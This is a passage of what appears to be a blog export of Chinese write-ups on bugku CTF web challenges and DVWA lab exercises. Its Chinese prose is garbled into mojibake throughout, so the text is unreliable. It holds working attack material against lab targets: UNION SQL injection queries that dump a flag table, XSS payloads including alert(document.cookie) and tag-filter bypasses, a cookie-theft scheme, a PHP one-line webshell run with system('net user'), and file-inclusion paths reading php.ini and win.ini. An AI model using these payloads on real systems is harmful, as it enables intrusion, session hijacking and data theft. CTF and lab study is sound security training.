getHTMLText(url): try: r = requests.get(url,timeout=30) r.raise_for_status() r .encoding = r.apparent_encoding return r.text except: return&quot;äº§ç”Ÿå¼‚å¸¸&quot; if __name__==&quot;__main__&quot;: a=30 for i in range(a): url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot;+str(i)+&quot;&amp;filename=aW5kZXgucGhw&quot; print(getHTMLText(url)) è¾“å‡ºindex.phpçš„ç½‘é¡µæºç  &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); â€‹ if(isset($_COOKIE[â€˜marginâ€™]) &amp;&amp; $_COOKIE[â€˜marginâ€™]==â€™marginâ€™){ $file_list[2]=&apos;keys.php&apos;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt; è¿™æ®µä»£ç çš„æ„æ€æ˜¯flagåœ¨keys.phpæ–‡ä»¶é‡Œï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥cookie:margin=marginæ‰å¯ä»¥çœ‹åˆ°æºç ã€‚è¿›è¡Œæ“ä½œåå‘ç°æ˜¯ç©ºç™½ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°äº†flag ä¸‰ã€ç¬¬24é¢˜ï¼ˆnever give upï¼‰æŸ¥çœ‹æºç å‘ç°é‚£ä¹ˆæˆ‘ä»¬è®¿é—®http://123.206.87.240:8006/test/1p.htmlå‘ç°æ˜¯bugkuçš„ä¸»é¡µï¼Œè¢«é‡å®šå‘äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ view-source:http://123.206.87.240:8006/test/1p.htm ç›´æ¥è®¿é—®æºç ï¼Œå‘ç°æºç ä¸­æœ‰ä¸€éƒ¨åˆ†è¢«urlç¼–ç äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œè§£ç ï¼Œå‘ç°æ˜¯base64ç¼–ç ï¼Œå†è§£ç å‘ç°æ˜¯urlç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†è§£ç ï¼Œç»ˆäºå¾—å‡ºäº†ä»¥ä¸‹å…³é”®çš„éƒ¨åˆ† &quot;;if(!$_GET[&apos;id&apos;]) { header(&apos;Location: hello.php?id=1&apos;); exit(); } $id=$_GET[&apos;id&apos;]; $a=$_GET[&apos;a&apos;]; $b=$_GET[&apos;b&apos;]; if(stripos($a,&apos;.&apos;)) { echo &apos;no no no no no no no&apos;; return ; } $data = @file_get_contents($a,&apos;r&apos;); if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4) { require(&quot;f4l2a3g.txt&quot;); } else { print &quot;never never never give up !!!&quot;; } â€‹ ?&gt; çœ‹ä¸‹è¿™éƒ¨åˆ†æºç å‘ç°æœ‰å¾ˆå¤šè¦æ±‚æ‰å¯ä»¥çœ‹åˆ°flag,é‚£ä¹ˆå°è¯•ä¸‹ç›´æ¥è®¿é—® http://123.206.87.240:8006/test/f4l2a3g.txt çœ‹åˆ°flagäº†ã€‚]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 17-20 write upï¼ˆwebï¼‰]]></title>
    <url>%2F2019%2F03%2F14%2Fbugku-17-20%2F</url>
    <content type="text"><![CDATA[ä¸€ã€ç¬¬17é¢˜ï¼ˆè¾“å…¥å¯†ç æŸ¥çœ‹flagï¼‰ã€‚æš´åŠ›ç ´è§£ï¼Œå¯å¾—å¯†ç ï¼Œç„¶åè¾“å…¥å¯†ç å¯å¾—flag äºŒã€ ç¬¬18é¢˜(ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡)æŸ¥çœ‹æºç å¯ä»¥å‘ç°ï¼Œurlä»¥postçš„æ–¹å¼æäº¤ç‚¹å‡»çš„æ¬¡æ•°ï¼Œé‚£ä¹ˆä½¿ç”¨hackerçš„poståŠŸèƒ½ï¼Œç›´æ¥ä¿®æ”¹clicks=1000000,å³å¯å¾—å‡ºflag ä¸‰ã€ç¬¬19é¢˜ï¼ˆå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼‰å°çŸ¥è¯†ï¼šå¤‡ä»½æ–‡ä»¶çš„æ‰©å±•åä¸€èˆ¬ä¸º*.swpï¼Œ.bakæ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸²å­—æ¯ï¼Œåº”è¯¥æ˜¯MD5åŠ å¯†æˆ‘ä»¬æ‹¿å»è§£å¯†ä¸‹ï¼Œç«Ÿç„¶ä¸ºç©ºã€‚çœ‹çœ‹é¢˜ç›®çš„æç¤ºï¼Œå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼Œæ˜¯è®©æˆ‘ä»¬å¯»æ‰¾ .bakæ–‡ä»¶çš„æˆ‘ä»¬ç”¨å¾¡å‰‘æ‰«æåå°ï¼Œå¾—å‡ºé‚£ä¹ˆå°è¯•ä¸‹http://123.06.87.240:8002/web16/index.php.bakæˆåŠŸä¸‹è½½æºç  &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//ä»£ç ä»?åå¼€å§‹æˆªå–åˆ°strä¸­ï¼Œä¹Ÿå°±æ˜¯å˜é‡åå¼€å§‹æˆªå–å­—ç¬¦ä¸² $str = substr($str,1);//å–$strä¸­å·¦è¾¹ç¬¬1ä½å¼€å§‹å–1ä½ã€‚ $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//åœ¨å­—ç¬¦ä¸²$strä¸­æ‰¾åˆ°å­—ç¬¦ä¸²keyï¼Œå¹¶æŠŠå®ƒæ›¿æ¢æˆç©ºï¼› parse_str($str);//æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼› echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;å–å¾—flag&quot;; } ä»£ç è¦æ±‚æˆ‘ä»¬æ„é€ å‡ºkey1å’Œkey2çš„md5å€¼ç›¸ç­‰ï¼Œè€Œå®ƒä»¬æœ¬èº«å´ä¸ç›¸ç­‰ï¼Œè¿™æ—¶å€™ç”¨åˆ°ä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼šmd5æ— æ³•å¯¹æ•°ç»„è¿›è¡Œæ„é€ ï¼Œæ„é€ çš„ç»“æœéƒ½ä¸ºNULLï¼Œè¿™æ ·æˆ‘ä»¬åªè¦è®©key1å’Œkey2æ˜¯ä¸¤ä¸ªæ•°ç»„å°±å¯ä»¥äº†ï¼Œï¼ˆkekeyyç»•è¿‡è¿‡æ»¤keyï¼‰ å››ã€ç¬¬20é¢˜ï¼ˆæˆç»©å•ï¼‰åœ¨è¿™é‡Œæ’å…¥ä»£ç ç‰‡æˆ‘ä»¬å…ˆè¾“å…¥1å‘ç°è¾“å‡ºè¾“å…¥-1å‘ç°æ²¡æœ‰è¾“å‡ºä¿¡æ¯è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸‹è¾“å…¥ -1&#39; union select 1,2,3,database()#å‘ç°flagçš„æ‰€åœ¨çš„æ•°æ®åº“è¾“å…¥-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#çˆ†å‡ºflagæ‰€åœ¨çš„è¡¨ è¾“å…¥-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#çˆ†å‡ºflagæ‰€åœ¨çš„å­—æ®µ è¾“å…¥-1&#39; union select 1,2,3,skctf_flag from fl4g# çˆ†å‡ºflagä¸ºBUGKU{Sql_INJECT0N_4813drd8hz4}]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWAä¹‹xss]]></title>
    <url>%2F2019%2F03%2F14%2FDVWA-xss%2F</url>
    <content type="text"><![CDATA[ä¸€ã€åå°„ï¼ˆreflectedï¼‰å‹ï¼ˆä¸€ï¼‰ã€å°è¯•lowç­‰çº§è¾“å…¥æ­£å¸¸æ•°å­—ï¼Œè¿”å›ä»¥ä¸‹å†…å®¹å†è¾“å…¥&lt;xss&gt;å‘ç°ï¼Œåªè¾“å‡ºäº†helloæˆ‘ä»¬ä½¿ç”¨ç«ç‹çš„å¼€å‘è€…å·¥å…·æŸ¥çœ‹ä¸‹å…ƒç´ å‘ç°helloçš„åé¢æ˜¯ä¸€å¯¹xssæ ‡ç­¾æˆ‘ä»¬è¿›è¡Œå¼¹çª—æµ‹è¯•è¾“å…¥&lt;script&gt;alert(/xss/)&lt;/script&gt;å‘ç°å¼¹çª—ï¼Œè¯´æ˜å­˜åœ¨xssæ³¨å…¥ä»‹ç»javaScriptçš„3ä¸ªå¼¹çª—å‡½æ•°alert() ,confirm() ,prompt()æ”»å‡»è€…æ€è·¯æ”»å‡»è€…webè®¾è®¡æ„é€ ä¼°è®¡çš„jsè„šæœ¬ document.locationå°±æ˜¯é¡µé¢çš„å†…å®¹å®šä½åˆ°æŒ‡å®šçš„ä½ç½®ï¼Œä»–ä¼šè®¿é—®å‚æ•°ä¸­çš„åœ°å€ï¼Œå‚æ•°é‡Œé¢å†™ä¸Šåˆšåˆšæ–°å»ºçš„phpæ–‡ä»¶çš„ç½‘å€ï¼Œdocument.cookieå°±æ˜¯èµ‹å€¼ç»™è¿™ä¸ªphpçš„cookieå‚æ•°ï¼Œè¿™ä¸ªcookieå€¼æœ€ç»ˆä¼šå‡ºç°åœ¨ç½‘ç«™127.0.0.1/cookie.phpä¸­æ„é€ å¹¶å‘é€æ”»å‡»urlè¿™æ ·å­è¿˜ä¸è¡Œè¿˜éœ€è¦urlç¼–ç æœ€ååŠ«æŒä¼šè¯ä¿®æ”¹cookieï¼Œä¿®æ”¹ä¸ºä¹‹å‰è·å–çš„cookieå€¼ã€‚ ï¼ˆäºŒï¼‰ã€å°è¯•mediumç­‰çº§ï¼Œåªè¦åœ¨&lt;srcipt&gt;æ ‡ç­¾ä¸­æ’å…¥ä¸€ä¸ª&lt;script&gt;å³å¯ï¼Œ&lt;src&lt;srcipt&gt;ipt&gt;ï¼Œå› ä¸ºä»–è¿‡æ»¤äº†&lt;sript&gt;æ ‡ç­¾å…¶ä»–æ­¥éª¤ä¸lowç­‰çº§ä¸€æ ·ã€‚ï¼ˆä¸‰ï¼‰å°è¯•highç­‰çº§ã€‚ä¸Šé¢çš„æ–¹æ³•éƒ½å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³åˆ°äº†imgæ ‡ç­¾ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œjsä»£ç çš„ &lt;img src= x onerror=alert(1)&gt; ä½¿ç”¨iframeæ ‡ç­¾ä¹Ÿå¯ä»¥æˆåŠŸæ³¨å…¥&lt;iframe onload=alert(1)&gt;è¯´æ˜åªè¿‡æ»¤äº†scriptæ ‡ç­¾ï¼ˆå››ï¼‰imposeç­‰çº§æŸ¥çœ‹æºç å‘ç°htmlspecialcharså‡½æ•°é‚£ä¹ˆè¿™æ˜¯å‡½æ•°æ˜¯å¹²å•¥çš„å‘¢ï¼Ÿå¯ä»¥æŠŠ &amp;è¿‡æ»¤æˆ&amp;amp; &quot;è¿‡æ»¤æˆ&amp;quto; &apos;è¿‡æ»¤æˆ&amp;apos; &lt;è¿‡æ»¤æˆ&amp;lt; &gt;è¿‡æ»¤æˆ&amp;gt; äºŒã€å­˜å‚¨å‹ï¼ˆstoredï¼‰åå°„ï¼ˆä¸€ï¼‰ã€å°è¯•lowç­‰çº§ï¼Œä½¿ç”¨ç«ç‹æµè§ˆå™¨å¼€å‘è€…å·¥å…·ï¼Œå‘ç°nameè¢«é™åˆ¶ä¸º10ä¸ªå­—ç¬¦ï¼Œmessageè¢«é™åˆ¶ä¸º50ä¸ªå­—ç¬¦.è¿™å¯¹æˆ‘ä»¬xssæ³¨å…¥æ˜¯ä¸å¤Ÿçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æŠ“åŒ…å‘é€name,messageå‚æ•°æˆåŠŸç»•è¿‡äº†é™åˆ¶å­˜å‚¨å‹çš„æ•°æ®æ˜¯å­˜åœ¨æ•°æ®åº“é‡Œï¼Œå¤§å®¶å¯ä»¥é€‰æ‹©setup/resetDBé‡ç½®æ•°æ®åº“ï¼Œæ¸…æ¥šæ•°æ®ï¼ˆäºŒï¼‰å°è¯•mediumç­‰çº§å‘ç°nameè¿‡æ»¤alert ,å’Œscriptæ ‡ç­¾ï¼Œmessageè¿‡æ»¤äº†scriptæ ‡ç­¾ã€‚å°è¯•scriptå¤§å°å†™å‘ç°æ— æ³•å¼¹çª—è¿™ä¸ªæ˜¯éƒ¨åˆ†æºç æˆ‘ä»¬å°è¯•iframeæ ‡ç­¾ txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook å‘ç°nameæˆåŠŸå¼¹çª—,ä½†æ˜¯messageä¸è¡Œï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œå¯ä»¥è¿›è¡Œxssæ³¨å…¥ ï¼ˆä¸‰ï¼‰ã€å°è¯•highç­‰çº§å’Œmediumçš„æ–¹æ³•ä¸€æ ·ï¼Œä¸åŒæ˜¯highç­‰çº§çš„messageå¯¹&lt; &gt; â€œ &amp; â€˜è¿›è¡Œäº†å¤„ç†ï¼ˆå››ï¼‰ã€å°è¯•imposeç­‰çº§æŸ¥çœ‹æºç nameå’Œmessageéƒ½å¯¹&lt; &gt; \â€ &amp; \â€™è¿›è¡Œäº†è¿‡æ»¤ ä¸‰ã€DOMå‹XSSï¼ˆä¸€ï¼‰ã€å°è¯•lowç­‰çº§æˆ‘ä»¬å°è¯•æ³¨å…¥ http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt; æˆåŠŸè¿›è¡Œæ³¨å…¥ï¼ŒæŸ¥çœ‹æºç å‘ç°ï¼Œæ²¡æœ‰ä»»ä½•ä¿æŠ¤æªæ–½ï¼ˆäºŒï¼‰ã€å°è¯•mediumç­‰çº§å‘ç°lowç­‰çº§çš„æ–¹æ³•å·²ç»å¤±æ•ˆäº†ï¼Œç»è¿‡å°è¯•å¯ä»¥å‘ç°ï¼Œscriptæ ‡ç­¾è¢«è¿‡æ»¤äº†ï¼Œè¿‡æ»¤æˆEnglishã€‚æŸ¥çœ‹æºç å‘ç°åªè¿‡æ»¤äº†scriptæ ‡ç­¾é‚£ä¹ˆæˆ‘ä»¬å°è¯• ä¸‹&lt;img src= x onerror=alert(1)&gt;é¡µé¢æ²¡æœ‰ååº”æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æˆ‘ä»¬çš„è¯­å¥è¢«æ’å…¥åˆ°äº†valueå€¼ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ’å…¥åˆ°optionæ ‡ç­¾çš„å€¼ä¸­ï¼Œä½¿ç”¨imgæ ‡ç­¾æ²¡æœ‰å‘æŒ¥ä½œç”¨æˆ‘ä»¬å°è¯•é—­åˆoption `http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt; å‘ç°è¿˜æ²¡æ²¡æœ‰é—­åˆæˆåŠŸã€‚æˆ‘ä»¬é—­åˆç”¨çš„&gt;&lt;è¢«é—­åˆåˆ°optionçš„å€¼å½“ä¸­å»äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¾€æ›´é«˜ä¸€å±‚çš„selectæ ‡ç­¾é—­åˆ http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt; æˆåŠŸæ³¨å…¥ï¼ˆä¸‰ï¼‰ã€å°è¯•highç­‰çº§å°è¯•äº†ä¸€ç•ªä¹‹åæ²¡æœ‰ç»“æœæˆ‘ä»¬æŸ¥çœ‹ä¸‹æºç ï¼Œå‘ç°æºç ä½¿ç”¨äº†ç™½åå•çš„æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä½¿ç”¨#æ³¨å…¥ï¼Œç¬¬ä¸€æ¬¡ä»æœ¬åœ°å†™å…¥ï¼Œç¬¬äºŒæ¬¡åˆ·æ–°çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„xss http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; æˆåŠŸæ³¨å…¥ ï¼ˆå››ï¼‰ã€imposeç­‰çº§å‘ç°æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆéƒ½ä¼šåœ¨å®¢æˆ·ç«¯ä½“ç°ï¼ŒæŸ¥çœ‹æºç å‘ç°åœ¨å®¢æˆ·ç«¯è¿›è¡Œäº†ä¿æŠ¤ã€‚è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ä¸ä¼šå¯¹URLè¾“å…¥è¿›è¡ŒURLç¼–ç è¿‡çš„å†…å®¹å†è¿›è¡ŒURLè§£ç ä»è€Œæœç»äº†DOMå‹XSSï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¾“å…¥ä»€ä¹ˆå°±ä¼šåœ¨æ¡†ä¸­ä½“ç°]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[file upload]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-upload%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å°è¯•lowç­‰çº§æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªphpinfo.phpæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸º&lt;?php echo pphpinfo()?&gt;,æŠŠè·¯å¾„æ‹¼æ¥èµ·æ¥ï¼Œè¾“å…¥ http://localhost/DVWA/hackable/uploads/phpinfo.php æˆåŠŸè·å¾—æ‰§è¡Œæˆ‘ä»¬ä¸Šæ¬¡çš„æ–‡ä»¶æˆ‘ä»¬å†ä¸Šä¼ ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ç„¶åç›´æ¥å°è¯•ç³»ç»Ÿå‘½ä»¤ http://localhost/DVWA/hackable/uploads/cmd.php ?cmd=system(&apos;net user&apos;); äºŒã€å°è¯•mediumç­‰çº§ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œå‘ç°æŠ¥é”™ï¼Œåªæ”¯æŒjpegå’Œpngæ ¼å¼çš„å›¾ç‰‡é‚£ä¹ˆæˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹ï¼Œä¸Šä¼ æˆåŠŸå’Œä¸Šä¼ ä¸æˆåŠŸçš„åŒ…æœ‰ä»€ä¹ˆå·®åˆ«ï¼Œç„¶åå°±æ˜¯ä¸æ–­çš„å°è¯•ï¼Œä¸ç«¯åœ°æŠŠä¸Šä¼ ä¸æˆåŠŸçš„åŒ…ä¸ä¸Šä¼ æˆåŠŸçš„ä¸åŒä¹‹å¤„æ”¹æˆå’Œä¸Šä¼ æˆåŠŸçš„åŒ…ç›¸åŒï¼Œç„¶åé‡æ–°å‘é€ï¼Œå‘ç°äº†ç ´è§£çš„åŠæ³•ä¸Šä¼ cmd.phpæ–‡ä»¶ï¼Œç„¶åæŠŠæ–‡ä»¶ç±»å‹æ”¹ä¸ºimag/jpegï¼Œé‡æ–°å‘é€å°±å¯ä»¥äº†ã€‚ä¸‰ã€highç­‰çº§å‰é¢çš„æ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†ã€‚å°è¯•äº†æ–‡ä»¶åç¼€åå’Œæ–‡ä»¶å†…å®¹å‘ç°éƒ½å¤±è´¥äº†é‚£ä¹ˆæˆ‘ä»¬å°±æƒ³åˆ°äº†â€åˆ¶ä½œå†…æ¶µå›¾â€œï¼Œå°±æ˜¯æŠŠæ–‡ä»¶å’Œå›¾ç‰‡åˆå¹¶æˆä¸€å¼ å›¾ç‰‡åœ¨cmdçª—å£ä¸‹ç”¨å‘½ä»¤ç»“åˆ copy 1.jpg/b +1.txt/a 2.jpg ç»“åˆæˆ2.jpgæˆ‘ä»¬ç”¨ç¼–è¾‘å™¨æ‰“å¼€ï¼Œåœ¨æ–‡ä»¶æœ«å°¾å‘ç°äº†æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬ é‚£æ—¢ç„¶ä¼ ä¸Šå»äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆç”¨å‘¢é¦–å…ˆæˆ‘ä»¬éœ€è¦åˆ‡æ¢ä¸‹æœåŠ¡å™¨ï¼Œåˆ‡æ¢æˆnginxåœ¨phpinié…ç½®æ–‡ä»¶é‡ŒæŠŠä¸‹é¢è¿™ä¸ªå‚æ•°æ”¹ä¸ºä¸€ï¼Œé»˜è®¤æ˜¯1ç„¶åè¾“å…¥http://localhost/DVWA//hackable/uploads/2.jpg/2.phpå³å¯ä¸Šä¼ ]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[file includes]]></title>
    <url>%2F2019%2F03%2F14%2Ffile-includes%2F</url>
    <content type="text"><![CDATA[ä¸€ã€å‰ç½®çŸ¥è¯†1ã€ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ä¸€ç§ä»£ç å¤„ç†æ–¹æ³•ï¼Œå‡½æ•°å¦‚include,requireç­‰ï¼Œå‚æ•°æ˜¯æ–‡ä»¶åã€‚2ã€æ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åçš„å‚æ•°ç”¨æˆ·å¯æ§ä¸”è¿‡æ»¤ä¸ä¸¥ï¼Œè¢«æ”»å‡»è€…å·æ¢æ¢æŸ± äºŒã€å°è¯•lowç­‰çº§æ‰“å¼€æ–‡ä»¶åŒ…å«é¢˜ç›®ä¼šå‘ç°ä»¥ä¸‹æç¤ºï¼Œæˆ‘ä»¬æ‰¾åˆ°php.inié…ç½®æ–‡ä»¶ï¼ˆä¸€èˆ¬åœ¨å®‰è£…ç›®å½•é‡Œï¼‰ï¼ŒæŠŠ allow_url_includeçš„å€¼æ”¹æˆonï¼Œç„¶åé‡å¯phpstudyå³å¯The PHP function allow_url_include is not enabledæˆ‘ä»¬ç‚¹å‡»æ–‡ä»¶ä¸€ã€æ–‡ä»¶2ã€æ–‡ä»¶3ã€å‘ç°äº†ä¸‹å›¾çš„è§„å¾‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å°è¯•ä¸‹è¾“å…¥ http://localhost/DVWA/vulnerabilities/fi/?page=test.php é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´äº†ï¼Œè¾“å…¥ http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini ..\çš„æ„æ€æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ã€‚å› ä¸ºphp.iniåœ¨DVWAç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨..\..\ ç›´æ¥è¾“å‡ºäº†è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ï¼Œè¯»å–å…¶ä»–ç›®å½•çš„phpè„šæœ¬ä¼šæ€æ ·ï¼Œæ˜¾ç¤ºå†…å®¹è¿˜æ˜¯æ‰§è¡Œphpä»£ç  è¾“å…¥ http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php è¿™è¯´æ˜äº†æ–‡ä»¶åŒ…å«ä¸ä»…ä»…æ˜¾ç¤ºå†…å®¹è¿˜ä¼šæ‰§è¡Œæ–‡ä»¶ã€‚ é‚£ä»€ä¹ˆä¼šæ‰§è¡Œè¿œç¨‹æ–‡ä»¶å—ï¼Ÿæˆ‘ä»¬å†æ¬¡å°è¯•å¯ä»¥æ‰§è¡Œå¹¶ä¸”éphpæ–‡ä»¶é‡Œé¢åªè¦åŒ…å«phpä»£ç å°±å¯ä»¥æ‰§è¡Œ é‚£ä¹ˆé—®é¢˜åˆæ¥äº†ã€‚è¿œç¨‹æ‰§è¡Œphpæ–‡ä»¶å’Œéphpæ–‡ä»¶æœ‰ä»€ä¹ˆå·®åˆ«å—ï¼Ÿå½“ç„¶æœ‰äº†ï¼Œä»¥ä¸Šé¢çš„phpinfo.phpå’Œphpinfo.txtä¸ºä¾‹ï¼Œè¿›è¡Œè¯´æ˜phpinfo.phpæ˜¯åœ¨æ”»å‡»è€…çš„webæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œè¿™æ¯«æ— æ„ä¹‰ï¼Œæˆ‘ä»¬æœŸæœ›çš„æ˜¯åœ¨å—å®³è€…çš„webæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œæ‰€ä»¥phpinfo.txtæ‰æ˜¯æ­£è§£ï¼Œï¼ˆphpinfo.txtåœ¨å—å®³è€…çš„webæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼‰ ä¸‰ã€å°è¯•mediumç­‰çº§ç”¨lowç­‰çº§çš„æ–¹æ³•å‘ç°ä¾ç„¶æˆåŠŸã€‚ä½†æ˜¯ä»–å’Œlowçš„ç­‰çº§æœ‰ä»€ä¹ˆå·®åˆ«å—å·®åˆ«åœ¨äºå®ƒè¿‡æ»¤äº†../è€Œlowçš„ç­‰çº§æ²¡æœ‰ã€‚ç¬¬ä¸€å¼ å›¾ä¸ºlowç­‰çº§ï¼Œç¬¬äºŒå¼ å›¾ä¸ºmediumç­‰çº§ä»£ç ã€‚å¯ä»¥å‘ç°å·®åˆ«åœ¨äºstr_place()å‡½æ•°ä»–æŠŠæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­çš„../å’Œ..\&quot;æ›¿æ¢æˆäº†ç©ºã€‚è¿˜æœ‰https://å’Œhttp://æ›¿æ¢æˆäº†ç©º é‚£ä¹ˆmediumç­‰çº§çš„è¿œç¨‹æ–‡ä»¶å¯ä»¥æ‰§è¡Œå—ã€‚å½“ç„¶å¯ä»¥äº†æ—¢ç„¶è¿‡æ»¤äº†http://é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨httphttp://://å¦‚ä¸‹å›¾ å››ã€highç­‰çº§æˆ‘ä»¬å°è¯•äº†mediumç­‰çº§çš„æ–¹æ³•ï¼Œè¿›è¡Œæœ¬åœ°æ–‡ä»¶æ‰§è¡Œå‘ç°ä»¥ä¸‹é”™è¯¯ç»å¸¸ä¸€ç•ªå°è¯•å‘ç°åªæ‰§è¡Œä»¥fileå¼€å¤´çš„æ–‡ä»¶ã€‚é‚£ä¹ˆè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°fileåè®®äº† é‚£ä¹ˆä»€ä¹ˆæ˜¯filesåè®®å‘¢å°±æ˜¯æ–‡æœ¬ä¼ è¾“åè®®ï¼Œè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶ è¾“å…¥ http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php file://åé¢æ˜¯æœ¬åœ°è·¯å¾„ï¼ŒæˆåŠŸæ‰§è¡Œæœ¬åœ°æ–‡ä»¶ä¹Ÿå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿæ–‡ä»¶ http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini é‚£ä¹ˆæ€æ ·è¿›è¡Œè¿œç¨‹æ–‡ä»¶æ‰§è¡Œå‘¢mediumæ–¹æ³•ä¸å¯ä»¥ï¼ŒæŸ¥çœ‹æºç ï¼Œå¯çŸ¥ç”¨fnmatch()å‡½æ•°é™åˆ¶å‚æ•°æ–‡ä»¶çš„å¼€å¤´è¿›å…¥imposeç­‰çº§é‚£ä¹ˆè¦å¦‚ä½•è¿œç¨‹æ‰§è¡Œå‘¢ï¼Œè¦å°±æœ‰æŠŠæ–‡ä»¶æ”¾åœ¨å›¾ç‰‡é‡Œï¼Œç„¶åä¸Šä¼ åˆ°webæœåŠ¡å™¨ï¼Œæ€ä¹ˆæŠŠæ–‡ä»¶æ”¾åœ¨å›¾ç‰‡é‡Œè¿™ç¯‡åšå®¢é‡Œçš„highç­‰çº§éƒ¨åˆ†è¯´æ˜äº†]]></content>
      <categories>
        <category>bugkuCTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Brute Force]]></title>
    <url>%2F2019%2F03%2F09%2FBrute-Force%2F</url>
